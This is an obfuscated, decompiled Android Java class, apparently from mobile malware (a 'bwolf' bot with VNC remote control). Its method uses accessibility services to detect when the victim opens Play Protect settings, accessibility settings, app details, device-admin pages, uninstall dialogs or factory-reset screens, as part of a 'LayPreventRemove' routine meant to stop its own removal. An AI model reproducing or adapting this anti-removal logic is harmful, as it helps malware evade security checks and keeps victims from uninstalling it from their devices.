package fddo;

import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sonnokta.p023w;

import java.util.List;
import java.util.Locale;

/* renamed from: fddo.case  reason: invalid class name */
public class Ccase extends Ctry {
    private static  String TAG = "bwolf-Ccase";

    public Ccase(Context context, p023w p023w, String str, String str2, boolean z) {
        super(context, p023w, str, str2, z);
    }

    /* renamed from: break  reason: not valid java name */
    public boolean m52break(String str) {

        if (!Cthrow.m158new(this.ifdf, "vnc", "").isEmpty()) {
            if (this.f130fddo) {
                Log.i(">>LayPreventRemove", "processLayout: vnc is running, protection disabled");
            }
            return false;
        } else if (!m163for()) {
            return false;
        } else {
            if (str.equals("gp_pages")) {
                if (fddo("com.android.vending|com.google.android.gms")) {
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = this.f85this.m20this().findAccessibilityNodeInfosByText("@gmail.com");
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText2 = this.f85this.m20this().findAccessibilityNodeInfosByText("Play Protect");
                    if (findAccessibilityNodeInfosByText.size() == 0 && findAccessibilityNodeInfosByText2.size() > 0) {
                        return true;
                    }
                }
                if (fddo("com.android.vending|com.google.android.gms")) {
                    if (m161case().contains("verifyappssettingsactivity")) {
                        if (this.f130fddo) {
                            Log.i(">>LayPreventRemove", "gp_pages: act is VerifyAppsSettingsActivity");
                        }
                        return true;
                    } else if (fddo.m90else(this.f85this.m20this(), "toolbar_item_play_protect_settings") != null) {
                        if (this.f130fddo) {
                            Log.i(">>LayPreventRemove", "gp_pages: settings icon found");
                        }
                        return true;
                    } else {
                        try {
                            if (this.f85this.m20this().findAccessibilityNodeInfosByText("Play Protect").size() > 0 && m167try("widget.Switch") == 2) {
                                if (this.f130fddo) {
                                    Log.i(">>LayPreventRemove", "gp_pages: 2 switches & Play Protect label found");
                                }
                                return true;
                            }
                        } catch (Exception unused) {
                        }
                    }
                }
                return false;
            }
            if (str.equals("xiaomi_autostart")) {
                return fddo("com.miui.securitycenter") && m161case().contains("autostartmanagementactivity") && m162else();
            }
            if (str.equals("usage_stats")) {
                if (fddo(p023w.f12else) && p023w.m7case().contains("usageaccess") && m162else()) {
                    return true;
                }
            } else if (str.equals("acsb_pages")) {
                if (!fddo("com.android.settings|com.samsung.accessibility|com.google.android.settings")) {
                    return false;
                }
                if (m161case().contains("accessibilityinstalled") || m161case().contains("accessibilitysettings")) {
                    if (this.f130fddo) {
                        Log.i(">>LayPreventRemove", "acsb_pages: act is accessibility");
                    }
                    return true;
                } else if ((m164goto() || m162else()) && fddo.m90else(this.f85this.m20this(), "/switch_text") != null && fddo.m90else(this.f85this.m20this(), "/switch_widget") != null) {
                    if (this.f130fddo) {
                        Log.i(">>LayPreventRemove", "acsb_pages: has switch_widget & loader/bot title");
                    }
                    return true;
                } else if ((!m164goto() && !m162else()) || m167try("widget.Switch") != 1 || m167try("widget.Button") != 0) {
                    return false;
                } else {
                    if (this.f130fddo) {
                        Log.i(">>LayPreventRemove", "acsb_pages: has loader/bot title & 1 switch");
                    }
                    return true;
                }
            } else if (str.equals("app_page")) {
                if (!fddo(p023w.f12else)) {
                    return false;
                }
                if ((m162else() || m164goto()) && m161case().contains("installedappdetails")) {
                    if (this.f130fddo) {
                        Log.i(">>LayPreventRemove", "app_page: page details detected");
                    }
                    return true;
                } else if ((!m162else() && !m164goto()) || m167try("widget.Button") < 2) {
                    return false;
                } else {
                    if (this.f130fddo) {
                        Log.i(">>LayPreventRemove", "app_page: page details with butts detected");
                    }
                    return true;
                }
            } else if (str.equals("devadmins_page")) {
                if (!fddo(p023w.f12else) || !m161case().contains("deviceadmin")) {
                    return false;
                }
                if (this.f130fddo) {
                    Log.i(">>LayPreventRemove", "devadmins_page: dev admins detected");
                }
                return true;
            } else if (str.equals("uns_dialog")) {
                if (!fddo(p023w.f12else)) {
                    return false;
                }
                if ((!m162else() && !m164goto()) || m167try("widget.TextView") != 2 || m167try("widget.Button") != 2) {
                    return false;
                }
                if (this.f130fddo) {
                    Log.i(">>LayPreventRemove", "shortapp_menu: uninstall dialog detected");
                }
                return true;
            } else if (!str.equals("reset_page") || !fddo(p023w.f12else)) {
                return false;
            } else {
                String lowerCase = fddo.m89class(this.f85this.m20this()).toLowerCase(Locale.ROOT);
                if (!lowerCase.contains("reset all network settings") && !lowerCase.contains("restablecimiento de fábrica")) {
                    if (lowerCase.contains("factory") || lowerCase.contains("predeterminados")) {
                        return lowerCase.contains("reset") || lowerCase.contains("restablecer");
                    }
                    return false;
                }
            }
        }

        return false;
    }
}
